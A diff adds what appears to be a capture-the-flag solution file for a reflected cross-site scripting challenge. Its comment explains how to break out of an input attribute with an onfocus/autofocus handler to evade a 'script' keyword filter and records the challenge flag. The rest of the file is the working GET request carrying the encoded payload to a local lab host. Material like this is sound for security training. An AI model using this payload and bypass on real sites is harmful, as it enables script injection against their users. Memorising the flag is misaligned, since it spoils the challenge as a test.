@@ -1,0 +1,4 @@
+# Reflected XSS via name param. Breaks out of input value attribute using event handler. Script keyword is filtered but onfocus+autofocus bypasses it. Returns CTF flag{e16c4cbe-6359-4d0a-b546-ff1325af95a3}
+
+GET /page?name=%22+onfocus%3D%22alert%28%27XSS%27%29%22+autofocus HTTP/1.1
+Host: 172.17.0.1:36677
